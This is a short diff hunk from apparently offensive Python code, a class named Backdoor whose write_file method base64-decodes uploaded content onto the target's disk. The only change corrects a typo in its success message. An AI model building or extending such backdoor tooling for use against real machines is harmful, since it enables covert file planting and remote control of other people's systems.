@@ -35,7 +35,7 @@ class Backdoor:
 	def write_file(self, path, content):
 		with open(path, "wb") as file:
 			file.write(base64.b64decode(content))
-			return "[+] Upload Succesful"
+			return "[+] Upload Successful"
 
 	def run(self):
 		while True:	
